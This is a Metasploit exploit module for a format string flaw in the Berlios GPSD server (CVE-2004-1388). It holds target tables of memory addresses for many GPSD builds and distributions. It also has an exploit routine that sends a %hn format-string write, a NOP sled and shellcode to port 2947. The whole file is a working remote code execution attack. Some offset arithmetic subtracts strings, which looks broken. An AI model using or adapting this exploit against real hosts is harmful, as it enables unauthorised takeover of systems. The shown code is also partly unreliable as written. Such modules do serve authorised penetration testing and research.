##
# $Id: gpsd_format_string.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Berlios GPSD Format String Vulnerability',
			'Description'    => %q{
					This module exploits a format string vulnerability in the Berlios GPSD server.
				This vulnerability was discovered by Kevin Finisterre.
			},
			'Author'         => [ 'Yann Senotier <yann.senotier [at] cyber-networks.fr>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2004-1388' ],
					[ 'OSVDB', '13199' ],
					[ 'BID', '12371' ],
					[ 'URL', 'http://www.securiteam.com/unixfocus/5LP0M1PEKK.html'],

				],
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1004,
					'BadChars' => "\x00\x0a\x0d\x0c",

				},
			'Targets'        =>
				[
					[ 'gpsd-1.91-1.i386.rpm', { 'Syslog' => 0x0804f250, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.92-1.i386.rpm', { 'Syslog' => 0x0804f630, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.93-1.i386.rpm', { 'Syslog' => 0x0804e154, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.94-1.i386.rpm', { 'Syslog' => 0x0804f260, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.95-1.i386.rpm', { 'Syslog' => 0x0804f268, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.96-1.i386.rpm', { 'Syslog' => 0x41424344, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-1.97-1.i386.rpm', { 'Syslog' => 0x0804b14c, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-2.1-1.i386.rpm', { 'Syslog' => 0x0804c7a0, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-2.2-1.i386.rpm', { 'Syslog' => 0x0804c7a0, 'Ret' => 0x41424344 }, ],
					[ 'gpsd-2.3-1.i386.rpm', { 'Syslog' => 0x0804c730, 'Ret' => 0xbfffd661 }, ],
					[ 'gpsd-2.4-1.i386.rpm', { 'Syslog' => 0x0804c7b8, 'Ret' => 0xbfffde71 }, ],
					[ 'gpsd-2.5-1.i386.rpm', { 'Syslog' => 0x0804c7dc, 'Ret' => 0xbfffdc09 }, ],
					[ 'gpsd-2.6-1.i386.rpm', { 'Syslog' => 0x0804c730, 'Ret' => 0xbffff100 }, ],
					[ 'gpsd-2.7-1.i386.rpm', { 'Syslog' => 0x0804c5bc, 'Ret' => 0xbfffcabc }, ],
					[ 'gpsd_2.6-1_i386.deb', { 'Syslog' => 0x0804c7c4, 'Ret' => 0xbfffedc8 }, ],
					[ 'gpsd_2.7-1_i386.deb', { 'Syslog' => 0x0804c6c4, 'Ret' => 0xbfffc818 }, ],
					[ 'gpsd_2.7-2_i386.deb', { 'Syslog' => 0x0804c770, 'Ret' => 0xbfffee70 }, ],
					[ 'SuSE 9.1 compiled 2.0', { 'Syslog' => 0x0804c818, 'Ret' => 0xbfffe148 }, ],
					[ 'Slackware 9.0 compiled 2.0', { 'Syslog' => 0x0804b164, 'Ret' => 0xbfffd7d6 }, ],
					[ 'Slackware 9.0 compiled 2.7', { 'Syslog' => 0x0804c3ec, 'Ret' => 0xbfffe65c }, ],
					[ 'Debug              ', { 'Syslog' => 0x41424344, 'Ret' => 0xdeadbeef }, ],
				],
			'DisclosureDate' => 'May 25 2005'))

		register_options(
			[
				Opt::RPORT(2947)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		offset = 17
		dump_fmt = 7
		al = 3

		hi = (target.ret >> 0) & 0xffff
		lo = (target.ret >> 16) & 0xffff

		shift0 = sprintf("%d",hi) - sprintf("%d",offset) - (dump_fmt * 8 + 16 + al)
		shift1 = (sprintf("%d",0x10000) +  sprintf("%d",lo)) - sprintf("%d",hi)

		buf  = "A" * 3 + "B" * 4
		buf +=  [ target['Syslog']].pack('V')
		buf += "B" * 4
		buf +=  [ target['Syslog'] + 0x2].pack('V')
		buf += "%.8x" * 7 + "%." + shift0 + "lx%hn" + "%." + shift1 + "lx%hn"
		buf += make_nops(3000) + payload.encoded

		sock.put(buf)

		handler
		disconnect
	end

end
